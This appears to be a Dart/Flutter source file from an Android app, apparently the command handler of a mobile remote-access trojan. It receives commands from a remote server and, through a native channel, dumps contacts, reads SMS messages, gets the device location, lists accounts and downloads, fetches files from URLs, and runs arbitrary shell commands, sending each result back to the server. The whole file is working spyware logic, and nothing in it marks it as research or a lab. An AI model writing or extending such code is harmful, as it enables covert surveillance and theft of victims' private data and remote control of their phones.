import 'package:flutter/services.dart';
import 'package:flutter/foundation.dart'; // For kDebugMode

// Define the MethodChannel (must match the name used in MainActivity.kt)
const MethodChannel _nativeChannel = MethodChannel('com.mycompany.mobilesecv2/native_commands');

// Define a type for the callback function to send results back to WebSocketService
typedef SendResultCallback = void Function(String commandId, dynamic output, String? error);

class NativeCommandHandler {
  Future<void> handleCommand(String command, String commandId, dynamic args, SendResultCallback sendResult) async {
    if (kDebugMode) {
      print('NativeCommandHandler handling command: $command with ID: $commandId and args: $args');
      print('  -> commandId: $commandId');
      if (args == null) {
        print('  -> args: IS NULL at handler entry');
      } else {
        print('  -> args: $args (Type: ${args.runtimeType}) at handler entry');
      }
    }
    try {
      dynamic result;
      // --- Map commands to native calls ---
      switch (command) {
        case 'dump_contacts':
          result = await _nativeChannel.invokeMethod('dumpContacts');
          break;
        case 'read_sms':
          // Expecting args from the server to be the number of messages
          int limit = 5; // Default limit
          if (args != null) {
              if (args is int) {
                 limit = args;
              } else if (args is String) {
                 limit = int.tryParse(args) ?? limit; // Use default if parse fails
              } else {
                  if (kDebugMode) {
                     print("Invalid type for read_sms limit: ${args.runtimeType}. Using default $limit.");
                  }
              }
          }
          if (limit <= 0) limit = 1; // Ensure limit is positive
          if (kDebugMode) {
            print("Calling native readSms with limit: $limit");
          }
          result = await _nativeChannel.invokeMethod('readSms', {'limit': limit});
          break;
        case 'get_location':
          result = await _nativeChannel.invokeMethod('getLocation');
          break;
        case 'list_downloads':
          result = await _nativeChannel.invokeMethod('listDownloads');
          break;
        case 'download_file':
          // Expecting args from the server to be the URL string
          if (args is String && Uri.tryParse(args)?.hasAbsolutePath == true) {
             if (kDebugMode) {
               print("Calling native downloadFile with URL: $args");
             }
            result = await _nativeChannel.invokeMethod('downloadFile', {'url': args});
          } else {
            if (kDebugMode) {
              print("Invalid or missing URL for download_file. Args: $args");
            }
            throw PlatformException(
                code: 'INVALID_ARGS',
                message: 'Missing or invalid URL for download_file command. Received: $args',
                details: 'Argument must be a valid URL string.');
          }
          break;
        case 'get_accounts':
          result = await _nativeChannel.invokeMethod('getAccounts');
          break;
        case 'ping': // Simple test command
          result = "pong from Flutter/Native";
          break;
        case 'custom_command':
          // Convert args to String and check if it's null or empty after conversion
          String? commandString = args?.toString(); // Safely convert to string

          if (commandString != null && commandString.isNotEmpty) {
            if (kDebugMode) {
              print("Calling native executeShellCommand with: '$commandString'");
            }
            // Call the new native method, passing the command string
            result = await _nativeChannel.invokeMethod('executeShellCommand', {'command': commandString});
            // The native side should return a map: {'stdout': '...', 'stderr': '...', 'exitCode': ...}
          } else {
             if (kDebugMode) {
              print("Invalid or missing command string for custom_command. Args received: $args"); // Log what was received
            }
            throw PlatformException(
                code: 'INVALID_ARGS',
                message: 'Missing or invalid command string for custom_command. Args must be a non-empty string.',
                details: 'Received: $args');
          }
          break;
        default:
           if (kDebugMode) {
             print('NativeCommandHandler received unknown command: $command');
           }
          throw PlatformException(code: 'UNKNOWN_COMMAND', message: 'Command "$command" not recognized by NativeCommandHandler.');
      }

      // Command executed successfully on native side (or produced a known result like 'pong')
       if (kDebugMode) {
         print('Native command "$command" executed successfully. Result: $result');
       }
      sendResult(commandId, result, null); // Send successful result back

    } on PlatformException catch (e) {
      // Error came specifically from the native platform channel invokeMethod
      if (kDebugMode) {
        print('Native PlatformException for command "$command" (ID: $commandId): ${e.code} - ${e.message} - ${e.details}');
      }
      // Send the platform error back
      sendResult(commandId, null, 'Native Error: ${e.code} - ${e.message}');
    } catch (e) {
      // Catch any other unexpected errors during command handling/parsing in Dart
      if (kDebugMode) {
        print('Generic error in NativeCommandHandler for command "$command" (ID: $commandId): $e');
      }
      // Send generic error back
      sendResult(commandId, null, 'Flutter Handling Error: ${e.toString()}');
    }
  }
}